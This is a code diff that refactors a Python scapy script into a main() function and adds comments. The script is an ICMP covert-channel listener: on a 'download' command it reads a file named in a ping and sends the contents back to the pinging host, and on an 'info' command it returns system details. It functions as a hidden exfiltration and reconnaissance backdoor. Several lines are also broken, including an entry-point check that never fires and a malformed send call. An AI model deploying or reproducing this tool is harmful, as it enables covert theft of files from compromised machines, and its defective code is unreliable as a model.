@@ -2,7 +2,8 @@ from scapy.all import *
 from time import sleep
 import sys, os, platform
 
-def clamp(inp, mini, maxi):
+def clamp(inp, mini=0, maxi=1):
+    # Basic clamp function - clamps intput between a minimum & maximum value (default is between 0 & 1).
     if (inp > maxi):
         return maxi
     elif (inp < mini):
@@ -11,11 +12,15 @@ def clamp(inp, mini, maxi):
         return inp
 
 def getInfo():
+    # Returns an string containing basic information about the machine (OS, OS Version, and Architecture).
     pltfrm_Info = [str(platform.platform()), str(platform.system()), str(platform.version()), str(platform.architecture()).join("")]
 
     return "\\xc3\\xab".join(pltfrm_Info)
 
 def download(payload, dst_IP):
+    # Given the payload from a packet containing a 'download' command, the file's contents are read to the
+    # variable 'data'. The variable 'data' is then split across the appropriate number of packets and sent to
+    # the client.
     with open(str(payload[1]), "rb") as file:
         data = file.read()
         file.close()
@@ -59,49 +64,54 @@ def download(payload, dst_IP):
         else:
             print("Packet not confirmed.")
 
-
-num_args = len(sys.argv)
-global chunk_size_limit
-if(num_args < 2):
-    print("No arguments supplied - using defaults")
-    chunk_size_limit = 1000
-else:
-    try:
-        chunk_size_limit = clamp(int(sys.argv[1]), 1, 1000)
-    except:
-        print("Chunk size must be an integer.")
+def main():
+    # Main logic for recieving requests & communicating with a client. Sets the limit for data transmitted
+    # per packet, then continues to the main loop waiting for commands from a client.
+    num_args = len(sys.argv)
+    global chunk_size_limit
+    if(num_args < 2):
+        print("No arguments supplied - using defaults")
         chunk_size_limit = 1000
-
-    print("Length of chunk: {}".format(chunk_size_limit))
-
-
-while True:
-    print("Waiting for packet.")
-    pkts = sniff(filter="icmp", count=1)
-
-    for pkt in pkts:
-        if (str(pkt[ICMP].type == 8)):
-            print("Valid packet type")
-        else:
-            break
-
-        print("Determining command.")
-
+    else:
         try:
-            print("Details:\nPacket Src: {}\nPacket Data: {}".format(str(pkt[IP].src), str(pkt[Raw].load)))
-            payload = str(pkt[Raw].load)[2:-1].split("\\xc3\\xab")
-            command = payload[0]
-            if (command == "download" and len(payload) == 2):
-                print("Checking for file.")
-                if (os.path.isfile(str(payload[1]))):        
-                    print("Downloading file {}".format(payload[1]))
-                    download(payload, str(pkt[IP].src)) 
-                else:
-                    print("File '{}' does not exist.".format(payload[1]))
-                    break
-            elif (command == "info"):
-                sys_Info = getInfo()
-
-                send(dst=str(pkt[IP].src)/ICMP(type=8)/(bytes(sys_Info.encode("UTF-8"))))
+            chunk_size_limit = clamp(int(sys.argv[1]), 1, 1000)
         except:
-            print("Invalid payload")
+            print("Chunk size must be an integer.")
+            chunk_size_limit = 1000
+
+        print("Length of chunk: {}".format(chunk_size_limit))
+
+
+    while True:
+        print("Waiting for packet.")
+        pkts = sniff(filter="icmp", count=1)
+
+        for pkt in pkts:
+            if (str(pkt[ICMP].type == 8)):
+                print("Valid packet type")
+            else:
+                break
+
+            print("Determining command.")
+
+            try:
+                print("Details:\nPacket Src: {}\nPacket Data: {}".format(str(pkt[IP].src), str(pkt[Raw].load)))
+                payload = str(pkt[Raw].load)[2:-1].split("\\xc3\\xab")
+                command = payload[0]
+                if (command == "download" and len(payload) == 2):
+                    print("Checking for file.")
+                    if (os.path.isfile(str(payload[1]))):        
+                        print("Downloading file {}".format(payload[1]))
+                        download(payload, str(pkt[IP].src)) 
+                    else:
+                        print("File '{}' does not exist.".format(payload[1]))
+                        break
+                elif (command == "info"):
+                    sys_Info = getInfo()
+
+                    send(dst=str(pkt[IP].src)/ICMP(type=8)/(bytes(sys_Info.encode("UTF-8"))))
+            except:
+                print("Invalid payload")
+
+if __name__ == "main":
+    main()
